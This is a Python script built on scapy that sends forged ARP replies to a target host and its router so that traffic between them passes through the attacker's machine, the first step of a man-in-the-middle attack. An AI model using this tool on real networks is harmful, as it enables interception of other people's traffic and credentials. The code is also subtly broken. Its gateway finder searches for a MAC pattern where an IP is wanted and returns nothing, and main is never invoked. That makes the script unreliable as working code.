#!/usr/bin/env python

import scapy.all as scapy
import argparse
import subprocess
import re


def router_ip_finder():
    dirty_Output = subprocess.check_output(["ip r | grep default"])
    cleaned_Output = re.search(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', dirty_Output)


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target's IP")
    parser.add_argument("-r", "--router", dest="router", help="Router's IP")
    options = parser.parse_args()

    if (not options.target):
        print("[-] Missing the target's IP")
        exit()
    elif (not options.router):
        print("[+] router's IP wasn't entered, finding gateway IP")
        options.router = router_ip_finder()

    return options


def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broad = broadcast/arp_request
    answered_list = scapy.srp(arp_req_broad, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(dest_IP, spoofed_IP):
    target_mac = get_target_mac(dest_IP)
    packet = scapy.ARP(op=2, pdst=dest_IP, hwdst=target_mac, psrc=spoofed_IP)

    return packet


def main():
    options = get_arguments()
    target_IP = options.target
    router_IP = options.router

    packet_for_target = spoof(target_IP, router_IP)
    packet_for_router = spoof(router_IP, target_IP)

    scapy.send(packet_for_target)
    scapy.send(packet_for_router)
